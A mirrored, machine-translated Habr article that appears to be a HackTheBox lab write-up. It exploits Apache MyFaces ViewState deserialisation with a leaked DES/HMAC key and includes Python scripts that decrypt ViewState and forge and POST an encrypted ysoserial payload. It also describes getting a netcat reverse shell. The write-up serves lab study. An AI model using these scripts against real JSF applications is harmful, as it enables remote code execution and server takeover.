<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèø‚Äçüî¨ üôÜüèæ üñ•Ô∏è Apache, ViewState & Deserialisation üö£üèø üñ≤Ô∏è üí´</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kami mempertimbangkan kerentanan berdasarkan spoofing objek ViewState Java berseri dan metode operasinya sebagai contoh aplikasi web...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Apache, ViewState & Deserialisation</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/tomhunter/blog/468815/"> Pada artikel ini, kami mempertimbangkan kerentanan berdasarkan spoofing objek ViewState Java berseri dan metode operasinya sebagai contoh aplikasi web mesin virtual dengan HackTheBox menggunakan teknologi Apache MyFaces. <br><br><img src="https://habrastorage.org/webt/ui/1-/yh/ui1-yhcioh5uxeg61z36gb92sbm.jpeg"><a name="habracut"></a><br><br>  JavaServer Faces (JSF) adalah platform pengembangan antarmuka pengguna untuk aplikasi web Java.  JSF menggunakan parameter ViewState untuk menyimpan keadaan halaman saat ini (misalnya, elemen halaman mana yang saat ini harus ditampilkan). <br><br><img src="https://habrastorage.org/webt/8a/59/ku/8a59ku6kh8evsnu-_rqjwwrqsws.jpeg"><br>  <i>(Formulir HTML untuk mengirim data)</i> <i><br></i> <br><br><img src="https://habrastorage.org/webt/mo/5e/dt/mo5edtmp9ydfmbpcpvxvudh_dk8.jpeg"><br><br>  ViewState adalah objek Java serial yang secara otomatis disematkan dalam bentuk HTML sebagai bidang tersembunyi dengan nama javax.faces.ViewState.  Saat mengirim data dari formulir, kami melihat bahwa parameter kondisi tampilan juga dikirim.  Dan karena itu adalah objek berseri, kita mungkin dapat mencoba untuk mengeksekusi perintah sisi-server (RCE) menggunakan objek berseri terisi kita sendiri, yang berisi muatan. <br>  <i>(Bagi mereka yang ingin mempelajari topik ini, saya sarankan membaca <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">materi ini di sini</a> ).</i> <i><br></i> <br>  Jadi mari kita mulai.  Artikel ini akan membahas kerentanan dan metode yang serupa. <br>  operasinya pada contoh aplikasi web dari mesin virtual yang rentan <br>  dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">HackTheBox</a> menggunakan teknologi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Apache MyFaces</a> . <br><br>  Dalam konfigurasi Apache MyFaces, Anda dapat mengaktifkan enkripsi komponen ViewState (dalam contoh kami, enkripsi DES-ECB digunakan), yang akan meningkatkan keamanan aplikasi. <br>  Jika enkripsi dinonaktifkan, maka kita perlu mengirim objek berseri melalui komponen ViewState untuk menjalankan perintah di sisi server.  Tetapi bagaimana jika aplikasi web menggunakan enkripsi dan kuncinya dikompromikan?  Ini sedikit menyulitkan tugas, mari kita lihat bagaimana berada dalam situasi seperti itu. <br><br>  Kami berhasil menemukan cadangan dengan file konfigurasi aplikasi web: <br><br><img src="https://habrastorage.org/webt/ox/ug/ls/oxuglssll2wwzk460erjhvtiibc.jpeg"><br><br>  Hebat!  Sekarang kita tahu SECRET, MAC_ALGORITHM, MAC_SECRET. <br>  Buka dokumentasi resmi.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Di</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> dan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br><img src="https://habrastorage.org/webt/uy/5f/3i/uy5f3iljhbdu7c5_vhokd5ykbwg.jpeg"><br><br>  Setelah mencerna informasi yang diterima, kami akan mencoba mendekripsi ViewState.  Untuk ini <br>  menggunakan Decoder BurpSuite kita akan membawanya ke bentuk normal dan menulis skrip Python kecil: <br><br><img src="https://habrastorage.org/webt/kf/sq/qb/kfsqqbanfb5rmclejstes05zwmu.jpeg"><br><br><div class="spoiler">  <b class="spoiler_title">Skrip python</b> <div class="spoiler_text"><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> Crypto.Cipher <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> DES <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pad</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(data) % <span class="hljs-number"><span class="hljs-number">8</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> n <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(len(data)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((len(data) + n) % <span class="hljs-number"><span class="hljs-number">8</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>: data += chr(n) * n <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data key = <span class="hljs-string"><span class="hljs-string">b'SnNGOTg3Ni0='</span></span> key = base64.b64decode(key) cipher = DES.new(key, DES.MODE_ECB) enctext = <span class="hljs-string"><span class="hljs-string">b'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='</span></span> <span class="hljs-comment"><span class="hljs-comment">#enctext = urllib.quote(enctext.decode("ascii")) enctext = base64.b64decode(enctext) enctext = pad(enctext) msg = cipher.decrypt(enctext) print(msg)</span></span></code> </pre> <br><br></div></div><br>  Outputnya adalah: <br><br><img src="https://habrastorage.org/webt/v2/ud/yl/v2udyl22z3oycatufaph-pvsg6a.jpeg"><br><br>  Ini adalah objek berseri yang berisi tanda tangan HmacSHA1 untuk pemeriksaan integritas. <br><br><h3>  Mari kita mulai membuat VIEWSTATE "diisi". </h3><br>  Untuk membuat muatan serial, kami akan menggunakan alat <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ysoserial</a></b> <br><br><img src="https://habrastorage.org/webt/28/n6/6v/28n66vgtkeqyrwpv4cwwkjajszm.jpeg"><br>  <i>(Saya akan mencoba melakukan ping sendiri (ip: 10.10.14.11) dari server)</i> <br><br>  Setelah <b>ysoserial,</b> muatan kami terlihat seperti ini: <br><br><img src="https://habrastorage.org/webt/js/an/pj/jsanpjcfn9mwyfk-z156qdamgkm.jpeg"><br><br>  Tetapi hanya mengirimkannya dalam bentuk ini tidak akan berhasil, kita sudah tahu bahwa server menggunakan otentikasi berdasarkan algoritma HmacSHA1, enkripsi DES-ECB, dan sebagai "penutup" terakhir semua ini di base64.  Mari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">kitaotomatiskan</a> semua ini dengan menulis skrip Python (terima kasih <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">be_a_saint</a> ). <br><br><div class="spoiler">  <b class="spoiler_title">Script Python lain</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> Crypto.Cipher <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> DES <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> hmac <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> hashlib <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">padding_append</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(data) % <span class="hljs-number"><span class="hljs-number">8</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> n <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(len(data)): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((len(data) + n) % <span class="hljs-number"><span class="hljs-number">8</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>: data += chr(n) * n <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt_viewstate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(viewstate, secret)</span></span></span><span class="hljs-function">:</span></span> secret = base64.b64decode(secret) des = DES.new(secret, DES.MODE_ECB) viewstate = padding_append(viewstate) viewstate = [viewstate[n:n+<span class="hljs-number"><span class="hljs-number">8</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> n <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(viewstate), <span class="hljs-number"><span class="hljs-number">8</span></span>)] viewstate = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(map(des.encrypt, viewstate)) viewstate += hmac.new(secret, viewstate, hashlib.sha1).digest() viewstate = base64.b64encode(viewstate) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> viewstate <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">create_payload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">'payload_ping.ser'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fi: payload_ping = fi.read() payload = encrypt_viewstate(payload_ping, <span class="hljs-string"><span class="hljs-string">"SnNGOTg3Ni0="</span></span>) payload = urllib.quote(payload.encode(<span class="hljs-string"><span class="hljs-string">"ascii"</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> payload victim_url = <span class="hljs-string"><span class="hljs-string">"http://127.0.0.1:8081/userSubscribe.faces"</span></span> post_data = <span class="hljs-string"><span class="hljs-string">"j_id_jsp_1623871077_1%3Aemail=test%40hello.com&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState="</span></span> payload = create_payload() os.system(<span class="hljs-string"><span class="hljs-string">'curl -d \"'</span></span> + post_data + payload + <span class="hljs-string"><span class="hljs-string">'\" -H \"Content-Type: application/x-www-form-urlencoded\" -X POST '</span></span> + victim_url)</code> </pre> <br></div></div><br>  Setelah mengatur pengalihan dalam BurpSuite, kita dapat melihat hasil dari eksekusi skrip - payload kami: <br><br><img src="https://habrastorage.org/webt/js/cz/mu/jsczmup5eutgd6huf3m0flfgugi.jpeg"><br><br>  Buka Wireshark, di BurpSuite klik Maju dan tangkap paket ICMP yang masuk, <br>  yang menunjukkan keberhasilan penyelesaian beban sisi server kami. <br><br><img src="https://habrastorage.org/webt/ak/jk/wr/akjkwrpkitctykowhplxuvjx8vu.jpeg"><br><br>  Contoh kecil lain dari payload dan hasilnya. <br><br><img src="https://habrastorage.org/webt/7p/a2/lc/7pa2lcbjs7ydd4suttkkxxw_wfa.jpeg"><br><br><img src="https://habrastorage.org/webt/ri/na/sz/rinasznzv1zkdedbmoy4wd7strg.jpeg"><br><br>  Demikian pula, payload berhasil. <br><br>  Dan jika ada sesuatu yang lebih serius?  Ok, mari kita isi server netcat dan dapatkan shell terbalik untuk diri kita sendiri: <br><br><img src="https://habrastorage.org/webt/sk/xn/a2/skxna2jnicdz6ceybzhkw_kdemm.png"><br><br>  Selesai!  Menerima shell atas nama layanan web, maka masalahnya adalah enumerasi <br>  dan eskalasi hak istimewa. <br><br>  Eksploitasi kerentanan ini menjadi mungkin sebagai hasil dari menerima RAHASIA server, maka kesimpulannya menunjukkan bahwa terlepas dari semua tindakan yang diambil untuk melindungi kode / aplikasi, salah satu kriteria keamanan yang paling penting tetap kerahasiaan data aplikasi sensitif (kata sandi, file konfigurasi, cadangan, dll.). d.). <br><br>  Itu saja, terima kasih sudah menonton! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id468815/">https://habr.com/ru/post/id468815/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id468799/index.html">Antipatterns dalam React atau Bad Tips for Beginners</a></li>
<li><a href="../id468803/index.html">Bagaimana Kami Membuat Mesin Workflow Kami</a></li>
<li><a href="../id468805/index.html">System.Console, Mono dan NCurses</a></li>
<li><a href="../id468811/index.html">Teknologi Yandex Turbo Pages dan Google AMP untuk e-commerce</a></li>
<li><a href="../id468813/index.html">Geolokasi dan geoposisi - mega-alat</a></li>
<li><a href="../id468819/index.html">Telegram Number Disclosure v.2 - Teknik Sosial</a></li>
<li><a href="../id468821/index.html">Bagaimana cara menulis kontrak pintar dengan Python pada Ontologi? Bagian 1: Blockchain & Block API</a></li>
<li><a href="../id468825/index.html">Berhentilah berpikir bahwa SLA akan menyelamatkan Anda. Kita perlu menenangkan dan menciptakan rasa aman yang salah.</a></li>
<li><a href="../id468827/index.html">Gadget untuk tidur</a></li>
<li><a href="../id468833/index.html">Cari algoritma bilangan prima</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>